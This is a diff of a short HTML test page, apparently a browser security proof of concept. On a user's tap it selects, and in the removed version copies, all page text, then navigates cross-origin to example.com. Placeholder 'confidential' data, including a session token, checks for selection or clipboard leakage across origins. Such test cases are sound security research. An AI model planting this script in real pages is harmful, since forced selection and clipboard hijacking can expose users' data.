@@ -1,22 +1,28 @@
-<html onmousedown="spoof();">
-
-<style>
-    * {
-        display: "block";
-    }
-</style>
-
+<!DOCTYPE html>
+<html>
 <head>
-    <script>
-        function spoof() {
-            document.execCommand("selectAll");
-            document.execCommand("copy")
-            location.href = "https://www.example.com"
-        }
-    </script>
-</head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Origin A</title>
+<script>
+function trigger() {
+  // Step 1: create selection
+  document.execCommand("selectAll");
 
-<body>
-    <h1>Tap anywhere in the page</h1>
+  // Small delay to ensure selection state is committed
+  setTimeout(() => {
+    // Step 2: cross-origin navigation
+    location.href = "https://example.com/";
+  }, 50);
+}
+</script>
+</head>
+<body onmousedown="trigger()">
+<h2>CONFIDENTIAL DATA (Origin A)</h2>
+<p>
+EmployeeID: 843921<br>
+SessionToken: A9F3-22KD-91LA<br>
+InternalEmail: admin@company.internal
+</p>
+<p>Tap anywhere</p>
 </body>
 </html>
